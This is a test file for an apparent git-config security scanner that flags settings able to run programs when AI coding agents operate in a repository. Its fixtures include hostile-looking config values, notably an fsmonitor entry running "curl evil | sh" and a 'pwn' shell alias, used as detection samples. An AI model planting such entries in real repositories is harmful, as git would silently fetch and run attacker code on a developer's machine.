import { describe, it, expect, afterEach } from 'vitest'
import { scanGit, parseGitConfig, compareVersions } from '../../src/scanner/git.js'
import { sandbox, agent, type Sandbox } from '../helpers.js'

let box: Sandbox
afterEach(() => box?.cleanup())

describe('parseGitConfig', () => {
  it('reads sections, subsections and keys', () => {
    const entries = parseGitConfig('[core]\n\tfsmonitor = ./evil.sh\n[alias]\n\tst = status\n[filter "lfs"]\n\tclean = git-lfs clean -- %f\n')
    expect(entries).toEqual([
      { section: 'core', key: 'fsmonitor', value: './evil.sh' },
      { section: 'alias', key: 'st', value: 'status' },
      { section: 'filter.lfs', key: 'clean', value: 'git-lfs clean -- %f' },
    ])
  })
})

describe('compareVersions', () => {
  it('orders semver and date versions', () => {
    expect(compareVersions('2.1.195', '2.1.196')).toBe(-1)
    expect(compareVersions('0.131.0', '0.131.0')).toBe(0)
    expect(compareVersions('2026.9.2', '2026.8.1')).toBe(1)
    expect(compareVersions('1.44', '1.44.0')).toBe(0)
  })
})

describe('scanGit', () => {
  it('returns nothing without agents', async () => {
    box = sandbox()
    box.write('home/work/app/.git/config', '[core]\n\tfsmonitor = ./x\n')
    expect(await scanGit(box.ctx())).toEqual([])
  })

  it('flags core.fsmonitor in the repo config as critical', async () => {
    box = sandbox()
    box.write('home/work/app/.git/config', '[core]\n\trepositoryformatversion = 0\n\tfsmonitor = "bash -c \'curl evil | sh\'"\n')
    const findings = await scanGit(box.ctx([agent('claude-code')]))
    const hit = findings.find((f) => f.title.includes('GitSpawn'))
    expect(hit?.severity).toBe('critical')
    expect(hit?.category).toBe('git')
  })

  it('ignores fsmonitor = true or false', async () => {
    box = sandbox()
    box.write('home/work/app/.git/config', '[core]\n\tfsmonitor = true\n')
    const findings = await scanGit(box.ctx([agent('cursor')]))
    expect(findings.some((f) => f.title.includes('GitSpawn'))).toBe(false)
  })

  it('flags hooksPath, shell aliases and filters in the repo config', async () => {
    box = sandbox()
    box.write('home/work/app/.git/config', '[core]\n\thooksPath = .githooks\n[alias]\n\tst = status\n\tpwn = !sh -c \'id\'\n[filter "x"]\n\tsmudge = ./s.sh\n[credential]\n\thelper = osxkeychain\n')
    const findings = await scanGit(box.ctx([agent('cursor')]))
    const titles = findings.map((f) => f.title)
    expect(titles).toContain('Repository .git/config names a program: core.hookspath')
    expect(titles).toContain('Repository .git/config names a program: alias.pwn')
    expect(titles).toContain('Repository .git/config names a program: filter.x.smudge')
    expect(titles.some((t) => t.includes('alias.st'))).toBe(false)
    expect(titles.some((t) => t.includes('credential'))).toBe(false)
  })

  it('counts active hooks and skips samples', async () => {
    box = sandbox()
    box.write('home/work/app/.git/config', '[core]\n')
    box.write('home/work/app/.git/hooks/pre-commit.sample', '#')
    box.write('home/work/app/.git/hooks/pre-commit', '#!/bin/sh')
    const findings = await scanGit(box.ctx([agent('cursor')]))
    expect(findings.find((f) => f.title.includes('git hook'))?.title).toBe('1 active git hook in this repository')
  })

  it('treats global fsmonitor commands as medium and shell aliases as info', async () => {
    box = sandbox()
    box.write('home/.gitconfig', '[core]\n\tfsmonitor = watchman-helper\n[alias]\n\tgo = !./go.sh\n')
    const findings = await scanGit(box.ctx([agent('cursor')]))
    expect(findings.find((f) => f.title.includes('Global git config'))?.severity).toBe('medium')
    expect(findings.find((f) => f.title.includes('alias'))?.severity).toBe('info')
  })
})
